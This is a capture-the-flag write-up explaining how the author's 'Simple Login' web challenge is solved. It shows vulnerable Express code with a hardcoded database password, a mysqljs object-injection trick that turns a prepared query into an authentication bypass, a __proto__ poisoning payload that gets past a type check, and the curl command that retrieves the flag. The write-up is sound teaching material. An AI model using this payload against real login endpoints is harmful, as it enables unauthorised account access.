---
source: kevin-mizu
source_url: https://mizu.re/post/simple_login
title: "Simple Login | mizu.re"
description: "Simple Login"
---

_keyboard\_arrow\_up_

title: Simple Login

date: Aug 30, 2022

tags: [Writeup](https://mizu.re/tag/Writeup) [10kCTF\_RootMe](https://mizu.re/tag/10kCTF_RootMe) [Web](https://mizu.re/tag/Web) [MyChallenges](https://mizu.re/tag/MyChallenges)

# Simple Login

![rootme_ctf.png](https://mizu.re/articles/writeups/10kCTF_RootMe/web/simple_login/images/rootme_ctf.png)

* * *

Difficulty: 499 points \| 6 solves

Description: Just a simple login for a simple challenge. Find a way to log in as admin :)

Author: Me :3

* * *

## Table of content

- [🕵️ Recon](https://mizu.re/post/simple_login#%EF%B8%8F-recon)
- [💉 SQL Injection](https://mizu.re/post/simple_login#-sql-injection)
- [🏭 Prototype Poisoning](https://mizu.re/post/simple_login#-prototype-poisoning)
- [🎉 Flag](https://mizu.re/post/simple_login#-flag)

## 🕵️ Recon

For this challenge, we had access to the source code. So, the first step was to take a look at the features that the app has to offer to us:

```js
var express = require('express');
var path = require('path');
var mysql = require('mysql');

var connection = mysql.createConnection({
    host: "127.0.0.1",
    user: "root",
    password: "dec369de7fbce7b10e640d88315a1813",
    database: "challenge",
});

var app = express();
app.use(express.json())

app.get('/', function (req, res) {
    res.sendFile(path.join(__dirname, 'login.html'));
});

app.post('/auth', function (req, res) {
    if (!req.is('application/json')) {
        res.send('Data must be send in JSON!', 400);

    } else {
        var credentials = req.body;

        if (typeof credentials.user === "object") {
            res.send("Attack detected!", 400);
        } else if (typeof credentials.password === "object") {
            res.send("Attack detected!", 400);

        } else {
            credentials = Object.assign({"flag": "RM{fake-flag}"}, credentials)

            var sql = "SELECT ? AS FLAG FROM users WHERE user = ? AND password = ?";
            connection.query(
                sql,
                [credentials.flag, credentials.user, credentials.password],
                (e, result, fields) => {
                    if (result.length > 0) {
                        res.send(result[0]["FLAG"], 200);
                    } else {
                        res.send("Invalid credentials!");
                    }
                }
            );
        }
    }
});

var server = app.listen(process.env.PORT || 3000, function () {
    console.log('Listening on port ' + server.address().port);
});
```

As we can see, it's a very basic login page which will give us the flag if we log into it.

## 💉 SQL Injection

At first glance, the code might look safe because it uses a prepared query but that's not true with the nodeJS's `mysql` library! In fact, has well described in this article ( [link](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4)), the nodeJS's `mysql` library will parse inputs differently based on their type if `stringifyObjects: true` isn't used for the MySQL connection. (even for prepared query)

The vulnerability occur when an object is used, for example:

```json
{
    "username": "admin",
    "password": {
        "password": 1
    }
}
```

In the query:

```sql
SELECT * FROM users WHERE user = ? and password = ?
```

Will become:

```sql
SELECT * FROM users WHERE user = "admin" and password = `password` = 1
```

As you can see, the object is split into a double equality. This is a huge problem because, in MySQL `password` is the same as \`password\` which gives us `1 = 1` which is `True`. Thus, sending this object will allow us to bypass the authentification.

![meme.jpg](https://mizu.re/articles/writeups/10kCTF_RootMe/web/simple_login/images/meme.jpg)

## 🏭 Prototype Poisoning

At this point, we could think that we just have to send our payload to be able to get the flag but, in the source code we can see that if `username` or `password` is an Object then the server will return `Attack detected!`... 🥲

```js
if (typeof credentials.user === "object") {
    res.send("Attack detected!", 400);
} else if (typeof credentials.password === "object") {
    res.send("Attack detected!", 400);
```

At this point, we could think to be out of options and this challenge is absolutly impossible but that where `Prototype Poisoning` comes! If we look closer at the code, we could see that the flag is added using `assign` function to our object.

```js
credentials = Object.assign({"flag": "RM{fake-flag}"}, credentials)
```

This function is quite interesting as it will merge all attributes of the 2nd object into the first one. ( [source](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/assign))

This could be abused to poison the prototype of the credentials Object, via `__proto__`.

What is the difference between Prototype Pollution and Prototype Poisonning?

The difference could seem to be complicated to figure out but, I facts it is really simple.

- A prototype pollution occurs when you pollute the prototype of the class Object which will cause to infect all child Object.
- A prototype poisoning occurs when you pollute only the prototype of the current object.

As you can see, it's just a matter of impact :p

Thus, if we place the password inside the prototype, it will check for `credentials.password` which is `null` at the time of the verification and just after, poison the prototype with our payload making it accessible from `credentials.password` when the SQL query occur.

```js
var credentials = req.body;

if (typeof credentials.user === "object") {
    res.send("Attack detected!", 400);
} else if (typeof credentials.password === "object") {
    res.send("Attack detected!", 400);

} else {
    credentials = Object.assign({"flag": "RM{fake-flag}"}, credentials)

    var sql = "SELECT ? AS FLAG FROM users WHERE user = ? AND password = ?";
```

Payload:

```json
{
    "user": "admin",
        "__proto__":
    {
        "password": {
            "password": 1
        }
    }
}
```

## 🎉 Flag

Now that we have all keys to get the flag, we just need to send the following JSON to the server:

```bash
curl -X POST http://ctf10k.root-me.org:6004/auth \
  -H 'content-type: application/json' \
  -d '{
    "user": "admin",
        "__proto__":
    {
        "password": {
            "password": 1
        }
    }
}'
```

Flag: `RM{Pr0t0_P01s0n1ng+ObJ3cT_SQL1_GOES_BRRRRRRRRRRRRR}` 🎉

[_keyboard\_arrow\_left_ Proxifier](https://mizu.re/post/proxifier)

[B33rupload _keyboard\_arrow\_right_](https://mizu.re/post/b33rupload)